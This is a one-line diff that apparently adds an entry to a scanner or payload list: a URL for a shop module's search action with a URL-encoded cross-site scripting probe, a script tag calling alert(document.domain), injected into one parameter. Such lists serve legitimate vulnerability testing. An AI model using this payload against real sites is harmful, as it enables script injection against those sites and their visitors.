@@ -1,0 +1,1 @@
+/shop/?module=shop&action=search&cat_id=0&a=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&pr1=0&pr2=0
